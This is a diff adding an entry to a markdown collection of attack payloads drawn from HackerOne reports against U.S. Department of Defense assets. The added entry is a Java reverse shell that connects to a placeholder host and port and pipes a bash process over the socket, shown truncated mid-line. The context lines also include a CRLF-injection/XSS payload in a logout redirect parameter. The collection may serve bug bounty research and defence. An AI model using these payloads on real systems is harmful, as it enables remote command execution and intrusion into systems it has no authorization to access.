@@ -1,6 +1,6 @@
 # U.S. Dept Of Defense
 
-225 payloads.
+226 payloads.
 
 ### `a1bb52f5`
 
@@ -1886,6 +1886,17 @@ https://█████/oauth/idp/logout?post_logout_redirect_uri=%0d%0a%0d%0a<s
 
 **Parameter:** `post_logout_redirect_uri`
 — [CVE-2023-24488 xss on https://██████/](https://hackerone.com/reports/2045549) · U.S. Dept Of Defense · [0xmaruf](https://hackerone.com/0xmaruf)
+
+### `39c09d95`
+
+```
+String host="your_server_ip";
+int port=1337;
+String cmd="bash";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exi
+```
+
+— [ Remote Code Execution and AWS IAM Credentials Exfiltration in https://████████/](https://hackerone.com/reports/2083771) · U.S. Dept Of Defense · [shuvam321](https://hackerone.com/shuvam321)
 
 ### `25f72612`
 
